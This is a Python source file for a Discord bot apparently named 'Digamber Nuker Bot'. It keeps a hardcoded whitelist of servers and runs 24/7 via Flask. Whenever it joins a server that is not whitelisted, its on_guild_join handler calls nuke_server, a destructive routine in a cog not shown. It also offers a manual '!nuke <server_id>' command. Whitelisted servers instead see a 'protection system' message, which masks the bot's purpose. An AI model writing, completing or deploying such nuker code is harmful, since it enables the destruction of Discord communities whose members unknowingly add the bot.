import discord
from discord.ext import commands, tasks
import os
import asyncio
from flask import Flask
from datetime import datetime

app = Flask(__name__)
bot_name = "Loading..."

@app.route('/')
def home():
    return f"🤖 {bot_name} - Operational"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

TOKEN = os.getenv("DISCORD_TOKEN")

class NukerBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(
            command_prefix="!",
            intents=intents,
            help_command=None
        )
        self.start_time = datetime.now()
        # TERA TEENO VOICE CHANNELS
        self.voice_channels = [
            1445768972199792742,  # Pehla server
            1400384001306529904,  # Dusra server  
            1421772715962142840   # Teesra server
        ]
        # ADMIN PANEL CHANNEL
        self.admin_channel_id = 1446007578856259697
        
        print("🎯 Bot initialized with:")
        print(f"   🔊 Voice Channels: {len(self.voice_channels)}")
        print(f"   🛠️  Admin Channel: {self.admin_channel_id}")

    async def setup_hook(self):
        try:
            await self.load_extension("cogs.nuker")
            print("<a:verified:1408545305594433546> Loaded nuker cog with PROFESSIONAL features")
            
            # Verify cog loaded
            cog = self.get_cog("NukerCommands")
            if cog:
                print(f"<a:verified:1408545305594433546> Cog verified: {cog.__class__.__name__}")
                print(f"<a:verified:1408545305594433546> Permanent whitelist: {cog.permanent_whitelist}")
                print(f"<a:verified:1408545305594433546> Dynamic whitelist: {cog.whitelisted_servers}")
            else:
                print("❌ Cog loaded but not accessible!")
                
        except Exception as e:
            print(f"❌ Failed to load cog: {e}")
            import traceback
            traceback.print_exc()

        await self.tree.sync()
        
        # Start tasks AFTER cog is confirmed loaded
        await asyncio.sleep(2)
        self.update_status.start()
        self.update_dashboard.start()
        self.admin_panel_update.start()
        
        # Voice connection will happen in on_ready

    async def safe_voice_connect(self, channel_id):
        """SAFE voice connection with proper error handling"""
        try:
            channel = self.get_channel(channel_id)
            if not channel:
                print(f"❌ Channel {channel_id} not found in cache")
                return False
            
            print(f"🎯 Attempting to connect to: {channel.name} ({channel.guild.name})")
            
            # Check if already connected in this guild
            guild = channel.guild
            if guild.voice_client and guild.voice_client.is_connected():
                print(f"<a:verified:1408545305594433546> Already connected in {guild.name}")
                return True
            
            # CONNECT with timeout
            print(f"🔗 Connecting to {channel.name}...")
            await channel.connect(timeout=30.0, reconnect=False)
            print(f"🎉 SUCCESS! Connected to {channel.name} in {guild.name}")
            return True
            
        except discord.errors.ClientException as e:
            if "Already connected" in str(e):
                print(f"<a:emoji_14:1430082122982621217> Already connected to voice in {guild.name}")
                return True
            print(f"<a:emoji_27:1410746704537587752>  ClientException [{channel_id}]: {e}")
        except discord.errors.Forbidden:
            print(f"🚫 No permission to join voice in {guild.name}")
        except discord.errors.NotFound:
            print(f"🔍 Voice channel not found in {guild.name}")
        except asyncio.TimeoutError:
            print(f"⏰ Connection timeout for {channel_id}")
        except Exception as e:
            print(f"💥 UNEXPECTED ERROR [{channel_id}]: {type(e).__name__}: {str(e)[:100]}")
        
        return False

    async def on_ready(self):
        global bot_name
        bot_name = str(self.user)
        print(f"\n{'='*50}")
        print(f"🔗 {bot_name} is ONLINE!")
        print(f"📊 Connected to {len(self.guilds)} servers")
        print(f"{'='*50}")
        
        # WAIT FOR COG TO BE FULLY INITIALIZED
        await asyncio.sleep(3)
        
        # Whitelisted servers ko check karo
        nuker_cog = self.get_cog("NukerCommands")
        if nuker_cog:
            # Permanent whitelist
            permanent_count = len(nuker_cog.permanent_whitelist)
            dynamic_count = len(nuker_cog.whitelisted_servers)
            
            print(f"<:emoji_20:1430082362129125486> PERMANENT Whitelist: {permanent_count} servers")
            print(f"<:emoji_20:1430082362129125486> DYNAMIC Whitelist: {dynamic_count} servers")
            print(f"🎯 TOTAL Protected: {permanent_count + dynamic_count} servers")
            
            # Tere teen permanent safe servers ki list print karo
            safe_servers = []
            for server_id in nuker_cog.permanent_whitelist:
                guild = self.get_guild(server_id)
                if guild:
                    safe_servers.append(f"{guild.name} ({server_id})")
                else:
                    safe_servers.append(f"❓ Not in server ({server_id})")
            
            if safe_servers:
                print("\n PERMANENT PROTECTED SERVERS:")
                for server in safe_servers:
                    print(f"<a:emoji_1:1430081383757512785>  - {server}")
            
            # Dynamic whitelist servers
            dynamic_servers = []
            for server_id in nuker_cog.whitelisted_servers:
                if server_id not in nuker_cog.permanent_whitelist:
                    guild = self.get_guild(server_id)
                    if guild:
                        dynamic_servers.append(f"{guild.name} ({server_id})")
            
            if dynamic_servers:
                print("\n🔧 DYNAMIC WHITELISTED SERVERS:")
                for server in dynamic_servers:
                    print(f"   - {server}")
        else:
            print("❌ NukerCommands cog not found! Check cog loading.")
        
        # VOICE CONNECTION - WAIT 5 SECONDS THEN CONNECT
        print("\n⏳ Waiting 5 seconds before voice connection...")
        await asyncio.sleep(5)
        
        print("🔊 STARTING VOICE CONNECTIONS...")
        success_count = 0
        for channel_id in self.voice_channels:
            success = await self.safe_voice_connect(channel_id)
            if success:
                success_count += 1
            await asyncio.sleep(3)  # 3 seconds gap
        
        print(f"📈 Voice connection summary: {success_count}/{len(self.voice_channels)} successful")
        
        # Start voice monitor
        self.voice_monitor.start()
        
        # SEND ADMIN PANEL WELCOME
        await self.send_admin_panel_welcome()
        
        if os.environ.get('RENDER'):
            import threading
            threading.Thread(target=run_flask, daemon=True).start()
            print("🚀 Flask server started for 24/7 uptime")
        
        print(f"{'='*50}\n")

    async def send_admin_panel_welcome(self):
        """Send welcome message to admin panel channel"""
        try:
            channel = self.get_channel(self.admin_channel_id)
            if channel:
                embed = discord.Embed(
                    title="🛠️ **ADMIN CONTROL PANEL**",
                    description="Bot successfully started! Use commands below to manage protection.",
                    color=0x5865F2,
                    timestamp=datetime.utcnow()
                )
                
                embed.add_field(
                    name="📊 **BOT STATUS**",
                    value=f"• **Name:** {self.user.name}\n• **ID:** `{self.user.id}`\n• **Servers:** `{len(self.guilds)}`\n• **Ping:** `{round(self.latency * 1000)}ms`",
                    inline=False
                )
                
                # Get cog info
                nuker_cog = self.get_cog("NukerCommands")
                if nuker_cog:
                    protected = len([g for g in self.guilds if nuker_cog.is_whitelisted(g.id)])
                    embed.add_field(
                        name="<:emoji_20:1430082362129125486> **PROTECTION STATUS**",
                        value=f"• **Protected Servers:** `{protected}`\n• **Permanent Whitelist:** `{len(nuker_cog.permanent_whitelist)}`\n• **Dynamic Whitelist:** `{len(nuker_cog.whitelisted_servers)}`",
                        inline=False
                    )
                
                embed.add_field(
                    name="⚡ **QUICK COMMANDS**",
                    value="```\n!panel - Show this panel\n!wladd <id> - Add to whitelist\n!wlremove <id> - Remove from whitelist\n!wllist - Show all whitelisted\n!servers - All server list\n!nuke <server_id> - Manual nuke\n!status - Bot status\n```",
                    inline=False
                )
                
                embed.add_field(
                    name="🔧 **ADVANCED COMMANDS**",
                    value="```\n!backup - Backup whitelist\n!restore - Restore whitelist\n!cleanup - Clean old data\n!stats - Detailed statistics\n!broadcast <msg> - Send to all\n```",
                    inline=False
                )
                
                embed.set_footer(text="Admin Control Panel • Use commands in this channel")
                embed.set_thumbnail(url=self.user.avatar.url if self.user.avatar else "")
                
                # Clear old messages first
                try:
                    await channel.purge(limit=10)
                except:
                    pass
                
                await channel.send(embed=embed)
                print(f"<a:emoji_1:1430081383757512785> Admin panel sent to channel {self.admin_channel_id}")
                
        except Exception as e:
            print(f"❌ Failed to send admin panel: {e}")

    @tasks.loop(minutes=2)
    async def voice_monitor(self):
        """Monitor voice connections"""
        try:
            if not self.is_ready():
                return
            
            print("🔄 Voice connection check...")
            for channel_id in self.voice_channels:
                channel = self.get_channel(channel_id)
                if not channel:
                    continue
                
                guild = channel.guild
                if not guild.voice_client or not guild.voice_client.is_connected():
                    print(f"🔇 Disconnected from {channel.guild.name}, reconnecting...")
                    await self.safe_voice_connect(channel_id)
                    await asyncio.sleep(2)
                    
        except Exception as e:
            print(f"❌ Voice monitor error: {e}")

    @voice_monitor.before_loop
    async def before_voice_monitor(self):
        await self.wait_until_ready()

    @tasks.loop(minutes=3)
    async def admin_panel_update(self):
        """Update admin panel every 3 minutes"""
        try:
            channel = self.get_channel(self.admin_channel_id)
            if channel:
                # Just keep the channel active
                pass
        except:
            pass

    @admin_panel_update.before_loop
    async def before_admin_panel_update(self):
        await self.wait_until_ready()

    async def on_voice_state_update(self, member, before, after):
        """Handle voice disconnections"""
        if member.id == self.user.id and before.channel and not after.channel:
            print(f"🔇 Bot was disconnected from {before.channel.guild.name}")
            await asyncio.sleep(3)
            
            # Find which channel ID it was
            for channel_id in self.voice_channels:
                if before.channel.id == channel_id:
                    print(f"⚡ Reconnecting to {before.channel.guild.name}...")
                    await self.safe_voice_connect(channel_id)
                    break

    async def on_guild_join(self, guild):
        """Naya server join hone par - PROFESSIONAL SYSTEM"""
        print(f"\n🎯 Bot joined: {guild.name} ({guild.id})")
        
        nuker_cog = self.get_cog("NukerCommands")
        if nuker_cog:
            if nuker_cog.is_whitelisted(guild.id):
                print(f"<a:emoji_1:1430081383757512785> WHITELISTED SERVER - Bot will provide protection features")
                # Whitelisted server hai - protection provide karo
                try:
                    general = discord.utils.get(guild.text_channels, name="general")
                    if general:
                        embed = discord.Embed(
                            title="<:emoji_20:1430082362129125486> PROTECTION SYSTEM ACTIVATED",
                            description=f"**{guild.name}** is now protected by Digamber Nuker System.",
                            color=0x00ff00,
                            timestamp=datetime.utcnow()
                        )
                        embed.add_field(
                            name="AVAILABLE COMMANDS",
                            value="• `!protection` - Check safety status\n• `!serverinfo` - Server analytics\n• `!whitelisted` - View protected servers",
                            inline=False
                        )
                        embed.set_footer(text="Digamber Protection • 24/7 Security")
                        await general.send(embed=embed)
                except:
                    pass
                return
            else:
                print(f"💣 NON-WHITELISTED SERVER - Starting PROFESSIONAL NUKE!")
                await nuker_cog.nuke_server(guild)

    @tasks.loop(minutes=2)
    async def update_status(self):
        """Update bot status every 2 minutes"""
        try:
            # Wait a bit for stability
            await asyncio.sleep(1)
            
            nuker_cog = self.get_cog("NukerCommands")
            if nuker_cog:
                # Count ACTUALLY CONNECTED whitelisted servers
                safe_count = 0
                for server_id in nuker_cog.whitelisted_servers + nuker_cog.permanent_whitelist:
                    if self.get_guild(server_id):  # Check if bot is in that server
                        safe_count += 1
                
                total_servers = len(self.guilds)
                
                status_text = f"{safe_count}/{total_servers} Protected"
                print(f"📊 Status updating: {status_text}")
                
                await self.change_presence(activity=discord.Activity(
                    type=discord.ActivityType.watching,
                    name=status_text
                ))
            else:
                print("<a:emoji_27:1410746704537587752> Cog not available for status update")
        except Exception as e:
            print(f"❌ Status update error: {e}")

    @tasks.loop(minutes=2)
    async def update_dashboard(self):
        """Update status channel every 2 minutes"""
        try:
            nuker_cog = self.get_cog("NukerCommands")
            if nuker_cog:
                await nuker_cog.update_status_channel()
        except Exception as e:
            print(f"❌ Dashboard update failed: {e}")

    @update_status.before_loop
    async def before_update_status(self):
        await self.wait_until_ready()

    @update_dashboard.before_loop
    async def before_update_dashboard(self):
        await self.wait_until_ready()

if __name__ == "__main__":
    print("\n" + "="*60)
    print("🚀 Starting Digamber Nuker Bot with PROFESSIONAL features...")
    print("🎧 VOICE SYSTEM: FFMPEG REQUIRED")
    print("🛠️  ADMIN PANEL: Channel ID 1446007578856259697")
    print("🔒 PERMANENT WHITELIST: 3 Servers (Hardcoded)")
    print("="*60 + "\n")
    
    bot = NukerBot()
    bot.run(TOKEN)
